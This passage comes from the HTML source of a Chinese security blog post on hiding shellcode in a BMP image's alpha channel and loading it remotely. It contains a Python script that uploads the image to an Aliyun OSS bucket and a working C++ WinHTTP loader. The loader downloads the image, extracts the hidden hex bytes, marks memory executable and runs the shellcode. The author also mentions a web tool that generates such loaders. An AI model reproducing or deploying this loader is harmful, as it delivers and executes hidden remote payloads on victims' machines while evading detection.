class="line">        self.ossDir = &quot;&quot;</span><br><span class="line">        self.randt = &quot;&quot;.join(</span><br><span class="line">            random.sample([x for x in string.digits + string.digits], 12))</span><br><span class="line">        self.connection()</span><br><span class="line"></span><br><span class="line">    def connection(self):</span><br><span class="line">        auth = oss2.Auth(self.accessid, self.accesskey)</span><br><span class="line">        self.bucket = oss2.Bucket(auth, self.endpoint, self.bucketstring)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def uploadFile(self):</span><br><span class="line">        pathfile = (str(self.randt) + &quot;.bmp&quot;)</span><br><span class="line">        os.rename(self.filename, pathfile)</span><br><span class="line">        remoteName = self.ossDir + os.path.basename(pathfile)</span><br><span class="line">        print(&quot;remoteName is&quot; + &quot;:&quot; + remoteName)</span><br><span class="line">        print(&#x27;uploading..&#x27;, pathfile, &#x27;remoteName&#x27;, remoteName)</span><br><span class="line">        result = self.bucket.put_object_from_file(remoteName, pathfile)</span><br><span class="line">        url = &quot;https://xxxx.oss-cn-beijing.aliyuncs.com/&#123;&#125;&quot;.format(pathfile)</span><br><span class="line">        print(&#x27;http_url: &#123;&#125; http_status: &#123;&#125;&#x27;.format(url,result.status))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    oss = OSS2(</span><br><span class="line">        accesskeyid=&#x27;xxxx&#x27;,</span><br><span class="line">        accesskeysecret=&#x27;xxxx&#x27;,</span><br><span class="line">        endpoint=&#x27;oss-cn-beijing.aliyuncs.com&#x27;,</span><br><span class="line">        bucket=&#x27;xxxx&#x27;,</span><br><span class="line">        filename =&#x27;test.bmp&#x27;</span><br><span class="line">    )</span><br><span class="line">    oss.uploadFile()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286914815-2665d6c2-69c4-40f4-9139-cc9580b1e61c.png" alt="img"></p>
+<h4 id="三、远程加载"><a href="#三、远程加载" class="headerlink" title="三、远程加载"></a>三、远程加载</h4><p>这里用WinHTTP库将上传在阿里云oss域名上的bmp图片内容远程读取到字符串中并获取alpha通道中隐藏的字节拼接shellcode，然后使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a>为shellcode分配内存。重要的是要注意，此内存页当前具有读取，写入和执行权限。之后，使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019">memcpy</a>将shellcode移到新分配的内存页面中。最后，执行shellcode。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">void download(const wchar_t *Url, const wchar_t *FileName, DownLoadCallback Func)</span><br><span class="line">&#123;</span><br><span class="line">	URL_INFO url_info = &#123; 0 &#125;;</span><br><span class="line">	URL_COMPONENTSW lpUrlComponents = &#123; 0 &#125;;</span><br><span class="line">	lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);</span><br><span class="line">	lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo;</span><br><span class="line">	lpUrlComponents.lpszHostName = url_info.szHostName;</span><br><span class="line">	lpUrlComponents.lpszPassword = url_info.szPassword;</span><br><span class="line">	lpUrlComponents.lpszScheme = url_info.szScheme;</span><br><span class="line">	lpUrlComponents.lpszUrlPath = url_info.szUrlPath;</span><br><span class="line">	lpUrlComponents.lpszUserName = url_info.szUserName;</span><br><span class="line"></span><br><span class="line">	lpUrlComponents.dwExtraInfoLength =</span><br><span class="line">		lpUrlComponents.dwHostNameLength =</span><br><span class="line">		lpUrlComponents.dwPasswordLength =</span><br><span class="line">		lpUrlComponents.dwSchemeLength =</span><br><span class="line">		lpUrlComponents.dwUrlPathLength =</span><br><span class="line">		lpUrlComponents.dwUserNameLength = 512;</span><br><span class="line"></span><br><span class="line">	WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &amp;lpUrlComponents);</span><br><span class="line"></span><br><span class="line">	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);</span><br><span class="line">	DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0;</span><br><span class="line">	HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);</span><br><span class="line">	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L&quot;HEAD&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);</span><br><span class="line">	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);</span><br><span class="line">	WinHttpReceiveResponse(hRequest, 0);</span><br><span class="line">	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &amp;dwContentSize, &amp;dwSizeDW, &amp;dwIndex);</span><br><span class="line">	WinHttpCloseHandle(hRequest);</span><br><span class="line"></span><br><span class="line">	hRequest = WinHttpOpenRequest(hConnect, L&quot;GET&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);</span><br><span class="line">	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);</span><br><span class="line">	WinHttpReceiveResponse(hRequest, 0);</span><br><span class="line"></span><br><span class="line">	BYTE *pBuffer = NULL;</span><br><span class="line">	pBuffer = new BYTE[dwContentSize];</span><br><span class="line">	ZeroMemory(pBuffer, dwContentSize);</span><br><span class="line">	do &#123;</span><br><span class="line">		WinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes);</span><br><span class="line">		Func(dwContentSize, dwReadBytes);</span><br><span class="line">	&#125; while (dwReadBytes == 0);</span><br><span class="line">	//cout &lt;&lt; pBuffer &lt;&lt; endl;</span><br><span class="line">	BITMAPFILEHEADER *pHdr = (BITMAPFILEHEADER *)pBuffer;</span><br><span class="line">	LPBYTE pStr = pBuffer + pHdr-&gt;bfOffBits + 3;</span><br><span class="line">	char szTmp[1900];</span><br><span class="line">	RtlZeroMemory(szTmp, 1900);</span><br><span class="line">	for (int i = 0; i &lt; 1900; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if (*pStr == 0 || *pStr == 0xFF)</span><br><span class="line">		&#123;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">		szTmp[i] = *pStr;</span><br><span class="line">		pStr += 4;</span><br><span class="line">	&#125;</span><br><span class="line">	//printf_s(szTmp);</span><br><span class="line"></span><br><span class="line">	unsigned int char_in_hex;</span><br><span class="line"></span><br><span class="line">	unsigned int iterations = strlen(szTmp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	unsigned int memory_allocation = strlen(szTmp) / 2;</span><br><span class="line"></span><br><span class="line">	# 还原shellcode</span><br><span class="line">	for (unsigned int i = 0; i &lt; iterations / 2; i++) &#123;</span><br><span class="line">		sscanf_s(szTmp + 2 * i, &quot;%2X&quot;, &amp;char_in_hex);</span><br><span class="line">		szTmp[i] = (char)char_in_hex;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	void* abvc = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	memcpy(abvc, szTmp, memory_allocation);</span><br><span class="line">	DWORD ignore;</span><br><span class="line">	VirtualProtect(abvc, memory_allocation, PAGE_EXECUTE, &amp;ignore);</span><br><span class="line"></span><br><span class="line">	(*(void(*)()) abvc)();</span><br><span class="line">	delete pBuffer;</span><br><span class="line">	WinHttpCloseHandle(hRequest);</span><br><span class="line">	WinHttpCloseHandle(hConnect);</span><br><span class="line">	WinHttpCloseHandle(hSession);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	download(L&quot;https://xxxx.oss-cn-beijing.aliyuncs.com:80/xxxxx.bmp&quot;, L&quot;./163Music&quot;, &amp;dcallback);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h4><p>思路和主要代码都给出来了，动动手就写出来了，这里我把以上功能做成Web在线生成的，采用模板化进行编译方便更新维护，有什么问题欢迎反馈交流。</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286872411-7930443a-697a-435d-8ba7-f30f2731804d.gif" alt="img"></p>
+<h3 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Matrix_Yao/archive/2009/12/02/1615295.html">https://www.cnblogs.com/Matrix_Yao/archive/2009/12/02/1615295.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq78442761/article/details/54880328">https://blog.csdn.net/qq78442761/article/details/54880328</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/loyalty-fox/idshwk7">https://github.com/loyalty-fox/idshwk7</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/life/">漂泊</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">0x02 相关概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">0x03 程序实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9B%BE%E7%89%87%E7%94%9F%E6%88%90"><span class="toc-number">3.1.</span> <span class="toc-text">一、图片生成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.2.</span> <span class="toc-text">二、文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.3.</span> <span class="toc-text">三、远程加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">3.4.</span> <span class="toc-text">自动化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&text=利用图片隐写术远程动态加载shellcode"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&is_video=false&description=利用图片隐写术远程动态加载shellcode"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用图片隐写术远程动态加载shellcode&body=Check out this article: https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&name=利用图片隐写术远程动态加载shellcode&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&t=利用图片隐写术远程动态加载shellcode"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/life/">漂泊</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
